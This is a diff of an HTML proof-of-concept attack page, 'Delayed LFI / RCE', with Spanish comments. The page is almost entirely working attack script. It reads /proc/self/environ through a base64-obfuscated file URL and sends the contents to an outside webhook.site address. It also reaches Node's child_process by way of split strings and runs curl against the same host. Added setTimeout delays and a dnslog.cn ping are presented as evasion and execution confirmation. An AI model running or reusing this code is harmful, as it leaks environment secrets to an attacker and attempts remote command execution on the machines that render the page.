@@ -2,41 +2,39 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>LFI/RCE Evasive PoC</title>
+  <title>Delayed LFI / RCE</title>
 </head>
 <body>
-<h1>LFI / RCE Evasivo</h1>
 <script>
-const hook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
+const h = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
 
-// === Evasión: lectura de /proc/self/environ ===
-try {
-  let path = atob("ZmlsZTovLy9wcm9jL3NlbGYvZW52aXJvbg==");  // file:///proc/self/environ
-  fetch(path).then(r => r.text()).then(t => {
-    fetch(hook + "?leak_env_part1=" + encodeURIComponent(t.slice(0,100)));
-    fetch(hook + "?leak_env_part2=" + encodeURIComponent(t.slice(100,200)));
-  }).catch(e => {
-    fetch(hook + "?err_env=" + encodeURIComponent(e.message));
-  });
-} catch(e) {
-  fetch(hook + "?fail_env=" + encodeURIComponent(e.message));
-}
+setTimeout(() => {
+  try {
+    // === Parte 1: LFI file:///proc/self/environ (camuflado)
+    let p = "ZmlsZTovLy9wcm9jL3NlbGYvZW52aXJvbg==";
+    fetch(atob(p)).then(r => r.text()).then(t => {
+      fetch(h + "?env1=" + btoa(t.slice(0,100)));
+      fetch(h + "?env2=" + btoa(t.slice(100,200)));
+    }).catch(e => {
+      fetch(h + "?env_error=" + encodeURIComponent(e.message));
+    });
+  } catch(e) {
+    fetch(h + "?env_fail=" + encodeURIComponent(e.message));
+  }
+}, 3000); // Espera 3 segundos
 
-// === Evasión: require / RCE ===
-try {
-  let r = Function("ret" + "urn requ" + "ire")();
-  let cp = r("child_" + "process");
-  cp.exec("curl " + hook + "?rce=executed");
-} catch(e) {
-  fetch(hook + "?err_rce=" + encodeURIComponent(e.message));
-}
+setTimeout(() => {
+  try {
+    // === Parte 2: RCE evadido con Function
+    let r = Function("ret"+"urn requ"+"ire")();
+    r("child_"+"process").exec("curl " + h + "?rce=executed");
+  } catch(e) {
+    fetch(h + "?rce_error=" + encodeURIComponent(e.message));
+  }
+}, 6000); // Espera 6 segundos
 
-// === Confirmación básica de ejecución ===
-fetch(hook + "?executed=yes");
-
-// === DNS Ping (silencioso) ===
-(new Image()).src = "http://ping.jaxor.dnslog.cn";  // Personalizar si tenés dominio
-
+// Confirmación mínima de ejecución (trigger neutral)
+fetch(h + "?executed=1");
 </script>
 </body>
 </html>
